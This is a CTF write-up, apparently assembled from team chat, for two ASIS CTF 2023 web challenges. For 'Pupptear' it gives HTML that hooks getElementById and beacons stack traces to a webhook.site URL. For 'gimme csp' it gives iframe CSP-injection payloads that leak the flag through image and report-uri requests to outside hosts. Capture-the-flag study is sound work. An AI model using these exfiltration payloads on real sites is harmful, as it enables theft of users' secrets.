---
title: ASISCTF
date: 2023-12-25 00:22:51
tags: ["2023"]
categories: ["challenge"]
---

## **Pupptear:**

***报错追踪文件名字

```
Do you know what Puppeteer's friends call him when he cries? Pupptear... hahahaah

[attachment](<https://asisctf.com/tasks/pupptear_0ab53ea3b73da58a4d0854bf42ec1ea166283b3e.txz>)

nc 18.195.96.13 2000

Flag format for Pupptear: ^ASIS{[^{}]+}$
```

[pupptear.txz](https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/7865afae-5d80-486d-b9d3-9239e8b4ff5e/pupptear.txz)

oh ok

I get the concept.

```jsx
url = input('input URL (b64ed): ')
if(not re.match('^[A-Za-z0-9=+/]+$',url)):
	print('bad URL')
	exit(1)

os.close(0)
os.close(1)
os.close(2)

containerName = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(0x10))
os.system(f'bash -c "sleep 5 && docker kill {containerName} 2>/dev/null" &')
os.system(f'docker run --name {containerName} pupptear bash -c \\'/ASIS*/index.js {url}\\' ')
#!/usr/bin/env node
const puppeteer = require('puppeteer')

const flag = 'flag{test-flag}';

async function visit(url){
	let browser;

	if(!/^https?:\\/\\//.test(url)){
		return;
	}

	try{
		browser = await puppeteer.launch({
		    pipe: true,
		    args: [
		        "--no-sandbox",
		        "--disable-setuid-sandbox",
		        "--js-flags=--noexpose_wasm,--jitless",
		        "--ignore-certificate-errors",
		    ],
		    executablePath: "/usr/bin/google-chrome-stable",
		    headless: 'new'
		});

		let page = await browser.newPage();
		await page.goto(url,{ timeout: 2000 });
		await page.waitForFunction(flag=>{
			let el = document.getElementById('flag')
			if(!el) return false
			el.value = flag
			return true
		},{ timeout: 2000 },flag)
		await new Promise(r=>setTimeout(r,3000));
	}catch(e){}
	try{await browser.close();}catch(e){}
	process.exit(0)
}
```

get folder name? have no idea.

need to check if we can get flag during page move delay![image-20240101163004369](../ASISCTF/image-20240101163004369-1707063823030-1.png)

fake flag. need to get folder name. i guess stacktrace from waitforfunction?

```docker
WORKDIR /app
COPY ./stuff/ /app/
RUN PUPPETEER_SKIP_DOWNLOAD=1 npm ci
RUN chmod +x /app/index.js
RUN useradd -m www
RUN chmod 777 /home/www/ -R
ENV FLAG=ASIS{test-flag}
RUN mv /app/ /$FLAG/
WORKDIR /
USER www
```

I guess yes.

One way is to hook `Error` and find filename, but I have to install puppeteer for testing. I don’t know how things work internally for puppeteer😕

If no one solves it I will try out sometime tomorrow.

i dont know either. ppt is heavily coupled with chrome devtools, i guess the function execution is a part of devtools protocol.

hook getElementById, read stacktrace.

solved:

```html
<!DOCTYPE html>
<body>
  <input type="text" id="flag" />
  <script>
    const oldFunc = document.getElementById
    document.getElementById = function(id) {
      const e = new Error();
      const stack = e.stack.split('\\n');
      fetch(`${document.location.href}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          id,
          stack
        })
      })
      return oldFunc.apply(document, arguments)
    }
  </script>
</body>

```

or

```
<!DOCTYPE html>
<body>
<script>
const HOOK_URL = "https://webhook.site/ae22bc03-bb75-4080-9702-36cbb57cc53d";

let sent = false;
function hook() {
  if (sent) return;
  sent = true;

  const e = new Error();
  navigator.sendBeacon(HOOK_URL, e.stack);
}
document.getElementById = hook;
</script>
</body>
```

![image-20240101162824320](../ASISCTF/image-20240101162824320-1707063823030-2.png)

```
Error
    at HTMLDocument.hook [as getElementById] (http://47.108.69.229/?id{aaa111}:11:13)
    at eval (eval at G (:3:1641), <anonymous>:4:22)
    at P.<anonymous> (pptr:evaluateHandle;WaitTask.rerun (/ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:80:54):4:36)
    at P.start (pptr:internal:3:3734)
    at pptr:evaluate;WaitTask.rerun (/ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:110:32):2:29
```

ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}





## **gimme csp(warmup):**

绕过csp-------iframe标签

```
hint for beginners: read about CSPs and Iframes and what features they can offer that you can use to bypass or exfiltrate things. The challenge isn't easy if you are new to CTFs or don't have much experience however it should be the easiest web challenge.

[attachment](<https://asisctf.com/tasks/gimme-csp_2b4abfa898695e4a37f7f36e4ba1b35a88f37103.txz>)

website: <https://gimmecsp.asisctf.com>
Admin bot: <http://18.195.96.13:8001>
```

[gimme-csp.txz](https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/afec582d-a963-4f8b-9bbb-a140d32e55dc/gimme-csp.txz)

ok

I can solve

server returned multiple csp header and only the default-src ‘none’ works

one last step…

```jsx
<iframe src="<https://gimmecsp.asisctf.com/?letter=$gift$></pre>1234<link rel='stylesheet' href='//fe.gy/1.css'></script>" csp="stylescript-src-src-elem 'self' 'unsafe-eval' <https://fe.gy> 'unsafe-inline';"  referrerpolicy="no-referrer"></iframe></body>
```

oh

got an idea 🙂

I think the `csp` attribute does some sort of sandboxing, we need to find some good way to prefetch or load the flag

```jsx
<iframe src="<https://gimmecsp.asisctf.com/?letter=></pre>1234<img src='<https://fe.gy/$gift$>'></script>" csp="img-src <https://fe.gy>; defascript-srcult-sscript-srcrc <https://fe.gy>; repscript-srcort-uscript-srcri <https://fe.gy>;" referrerpolicy="no-referrer"></iframe></body>
```

ok

I think I can get flag now?

Here’s a way

solved now

exploit:

```jsx
<iframe src="<https://gimmecsp.asisctf.com/?letter=></pre>1234<img src='<http://$gift$.harold.kim:1337/>'></script>" csp="img-src https://*; defascript-srcult-sscript-srcrc <http://harold.kim:1337/>; repscript-srcort-uscript-srcri <https://azusawa.world/a.php;"> referrerpolicy="no-referrer"></iframe></body>
{"csp-report":{"document-uri":"[<https://gimmecsp.asisctf.com/?letter=></pre>1234<img src='<http://$gift$.harold.kim:1337/>'></script>","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src](<https://gimmecsp.asisctf.com/?letter=%3C/pre%3E1234%3Cimg%20src=%27http://$gift$.harold.kim:1337/%27%3E%3C/script%3E%22,%22referrer%22:%22%22,%22violated-directive%22:%22img-src%22,%22effective-directive%22:%22img-src%22,%22original-policy%22:%22img-src>) https://*; default-src <http://harold.kim:1337/>; report-uri [<https://azusawa.world/a.php;","disposition":"enforce","blocked-uri":"https://asis{test-flag}.harold.kim:1337/","line-number":1,"source-file":"https://gimmecsp.asisctf.com/","status-code":200,"script-sample":">](<https://azusawa.world/a.php;%22,%22disposition%22:%22enforce%22,%22blocked-uri%22:%22https://asis%7Btest-flag%7D.harold.kim:1337/%22,%22line-number%22:1,%22source-file%22:%22https://gimmecsp.asisctf.com/%22,%22status-code%22:200,%22script-sample%22:%22>)"}}```
```

ASIS{1m-n07-r34dy-f0r-2024-y3t-dfadb}





